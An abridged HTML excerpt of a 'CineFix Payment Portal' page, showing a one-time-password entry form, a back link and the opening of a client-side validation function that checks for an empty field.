...
<head>
  ...
  <title>CineFix Payment Portal</title>
...
<body>
    ...
    <form name="form1" id="form1" method="post" action="complete_payment.php">
      <fieldset class="page2">
        ...
        <div class="row formInputSection">
          <div class="large-7 columns">
            <label>
              ...
              <input type="tel" name="otp" id="customerpin" class="form-control optPass" value="" maxlength="6"
                autocomplete="off" />
            </label>
          </div>
        ...
        <p>
          ...
          <a class="tryAgain" href="complete_order.jsp">Go back</a>
        </p>
      </fieldset>
  ...
  <script>
    ...
    function ValidateForm() {
      ...
      if (document.form1.customerpin.value == "") {
